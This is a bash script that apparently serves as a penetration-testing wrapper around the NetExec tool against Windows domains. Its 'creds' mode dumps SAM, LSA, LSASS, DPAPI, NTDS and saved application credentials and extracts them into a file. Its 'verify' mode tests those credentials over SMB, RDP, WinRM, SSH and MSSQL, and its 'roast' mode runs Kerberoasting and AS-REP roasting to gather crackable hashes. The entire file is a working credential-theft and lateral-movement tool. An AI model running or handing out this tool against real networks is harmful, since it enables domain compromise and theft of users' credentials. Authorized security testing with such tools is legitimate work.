#!/usr/bin/env bash

# ───────── Colors ──────────
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
NC="${C}[0m"

# ───────── Usage ──────────
usage() {
  echo -e "${YELLOW}Usage:${NC} $0 <mode> <target> -u <user> (-p <pass> | -H <hash> | --aesKey <key> --kdcHost <dc>) -o <output-dir> [--local-auth]"
  echo ""
  echo "  <mode>        creds | verify | roast"
  echo "  <target>      Single IP or CIDR (or DC for roast mode)"
  echo "  -u            Username"
  echo "  -p            Password"
  echo "  -H            NTLM hash"
  echo "  --aesKey      Kerberos AES key (requires --kdcHost)"
  echo "  --kdcHost     Domain Controller to contact (used with --aesKey)"
  echo "  -o            Output directory (will be created if it doesn't exist)"
  echo "  --local-auth  Specify if it's a local account (ignored with --aesKey)"
  echo "  -h            Show this help"
  exit 1
}

# ───────── Parse Arguments ──────────
MODE="$1"
shift
TARGET="$1"
shift

LOCAL_AUTH=0
AESKEY=""
KDCHOST=""

# Pre-scan args for long options
for arg in "$@"; do
  case "$arg" in
  --local-auth)
    LOCAL_AUTH=1
    set -- "${@/--local-auth/}"
    ;;
  --aesKey) AESKEY_SET=1 ;;
  --kdcHost) KDCHOST_SET=1 ;;
  esac
done

while [[ $# -gt 0 ]]; do
  case "$1" in
  -u)
    USER="$2"
    shift 2
    ;;
  -p)
    PASS="$2"
    shift 2
    ;;
  -H)
    HASH="$2"
    shift 2
    ;;
  --aesKey)
    AESKEY="$2"
    shift 2
    ;;
  --kdcHost)
    KDCHOST="$2"
    shift 2
    ;;
  -o)
    OUTDIR="$2"
    shift 2
    ;;
  -h) usage ;;
  *) shift ;;
  esac
done

# ───────── Validate Arguments ──────────
if [[ -z "$MODE" || -z "$TARGET" || -z "$USER" || -z "$OUTDIR" ]]; then
  usage
fi

if [[ "$MODE" != "creds" && "$MODE" != "verify" && "$MODE" != "roast" ]]; then
  echo -e "${RED}[-] Mode must be one of: creds, verify, roast${NC}"
  usage
fi

# auth validation
if [[ -n "$AESKEY" || -n "$KDCHOST" ]]; then
  if [[ -z "$AESKEY" || -z "$KDCHOST" ]]; then
    echo -e "${RED}[-] --aesKey requires --kdcHost and vice versa${NC}"
    usage
  fi
  if [[ -n "$PASS" || -n "$HASH" ]]; then
    echo -e "${RED}[-] Cannot use --aesKey with -p or -H${NC}"
    usage
  fi
else
  if [[ -z "$PASS" && -z "$HASH" ]]; then
    echo -e "${RED}[-] Must specify either -p, -H, or --aesKey+--kdcHost${NC}"
    usage
  elif [[ -n "$PASS" && -n "$HASH" ]]; then
    echo -e "${RED}[-] Specify only one of -p or -H${NC}"
    usage
  fi
fi

if [[ "$MODE" == "verify" ]]; then
  LOGFILE="$OUTDIR"/"${USER}_${MODE}.log"
else
  LOGFILE="$OUTDIR"/"${TARGET}_${MODE}.log"
fi
mkdir -p "$OUTDIR"
touch "$LOGFILE"

log() {
  echo -e "${BLUE}[+]${NC} $1"
}

run_nxc() {
  log "Running: $*"
  unbuffer $* | tee -a "$LOGFILE"
}

# build base auth flags
BASE_AUTH_ARGS="-u $USER"
if [[ -n "$PASS" ]]; then
  BASE_AUTH_ARGS+=" -p $PASS"
elif [[ -n "$HASH" ]]; then
  BASE_AUTH_ARGS+=" -H $HASH"
elif [[ -n "$AESKEY" ]]; then
  BASE_AUTH_ARGS+=" --aesKey $AESKEY --kdcHost $KDCHOST"
fi

AUTH_ARGS="$BASE_AUTH_ARGS"
if [[ $LOCAL_AUTH -eq 1 && -z "$AESKEY" ]]; then
  AUTH_ARGS+=" --local-auth"
fi

# ───────── Mode Logic ──────────
case "$MODE" in
creds)
  log "Starting credential collection…"
  run_nxc nxc smb "$TARGET" $AUTH_ARGS --sam
  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M lsassy
  run_nxc nxc smb "$TARGET" $AUTH_ARGS --lsa
  run_nxc nxc smb "$TARGET" $AUTH_ARGS --dpapi
  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M wifi
  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M winscp
  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M rdcman
  run_nxc nxc smb "$TARGET" $AUTH_ARGS --sccm

  # Not including PS-history in logfile not to ruin the creds file
  log "Running: nxc smb $TARGET $AUTH_ARGS -M powershell_history"
  unbuffer nxc smb $TARGET $AUTH_ARGS -M powershell_history

  log "Running: nxc smb $TARGET $AUTH_ARGS --ntds"
  script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds"

  log "Extracting potential credential lines…"
  CREDFILE="$OUTDIR"/"${TARGET}_${MODE}.creds"
  awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' $LOGFILE |
    rg -a '^\x1b\[1;33m|^Node' |
    sed -r 's/\x1b\[[0-9;]*m//g' |
    sort -u >$CREDFILE

  echo -e "${GREEN}[✓] Raw output:           ${LOGFILE}"
  echo -e "${GREEN}[✓] Unique credentials:   ${CREDFILE}"
  ;;

verify)
  log "Starting service verification…"
  run_nxc nxc smb "$TARGET" $AUTH_ARGS --shares
  # run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS
  run_nxc nxc rdp "$TARGET" $BASE_AUTH_ARGS
  run_nxc nxc winrm "$TARGET" $BASE_AUTH_ARGS
  run_nxc nxc ssh "$TARGET" $BASE_AUTH_ARGS
  run_nxc nxc mssql "$TARGET" $BASE_AUTH_ARGS

  sed 's/\r/\n/g' "$LOGFILE" | rg -v Running >"$LOGFILE.tmp" && mv "$LOGFILE.tmp" "$LOGFILE"
  echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
  ;;

roast)
  log "Starting kerberoast & asreproast…"
  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting "$OUTDIR/kerberoast.hash"
  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast "$OUTDIR/asrep.hash"
  echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
  echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
  ;;
esac
